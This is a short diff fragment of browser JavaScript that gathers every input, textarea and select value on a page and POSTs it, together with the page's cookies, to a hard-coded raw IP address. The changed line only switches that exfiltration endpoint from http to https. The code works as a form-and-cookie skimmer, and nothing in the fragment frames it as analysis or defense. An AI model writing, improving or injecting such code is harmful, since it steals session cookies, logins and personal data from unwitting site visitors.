@@ -15,7 +15,7 @@ let formData = Array.from(document.querySelectorAll("input, textarea, select")).
 }));
 
 // Send the captured data to your server (you can use a GET or POST request)
-fetch("http://185.196.11.208:8000/log", {
+fetch("https://185.196.11.208:8000/log", {
   method: "POST",
   body: JSON.stringify({
     cookies: cookies,
